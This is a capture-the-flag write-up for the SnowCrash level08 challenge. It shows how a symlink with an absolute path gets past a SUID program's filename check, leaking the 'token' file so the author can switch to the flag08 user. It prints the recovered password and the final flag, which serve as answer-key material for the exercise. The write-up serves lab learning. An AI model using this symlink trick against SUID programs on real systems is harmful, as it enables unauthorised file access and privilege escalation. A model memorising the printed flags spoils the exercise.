# Level08

In this level we 2 files. An executable and a file called `token` int which we don't have permissions.
This program reads a file as long as his name is different from `token`. So we have try to create a `symbolic link` of this file to get his content.  
The only person who has access to this file is flag08. It's good because we have (again) the SUID activated.  
So the file will be read by the program even if we haven't permissions. 

```bash
level08@SnowCrash:~$ ln -sf "./token" "/tmp/file"
level08@SnowCrash:~$ ./level08 /tmp/file
level08: Unable to open /tmp/file2: No such file or directory
```
We have a problem but we thinking we are in the good way.  

```bash
level08@SnowCrash:~$ ls -la /tmp/file
lrwxrwxrwx 1 level08 level08 7 May 18 04:09 /tmp/file -> ./token
```

We can see that our symbolic link is not correct. The redirection is to a file with an incorrect path. We can try with an `absolut path`:  

```bash
level08@SnowCrash:~$ ln -sf "${PWD}/token" "/tmp/file"
level08@SnowCrash:~$ ./level08 /tmp/file
quif5eloekouj29ke0vouxean
```

It's working ! We can access to `flag08` to get the flag.  

```bash
level08@SnowCrash:~$ su flag08
Password: 
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag 
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
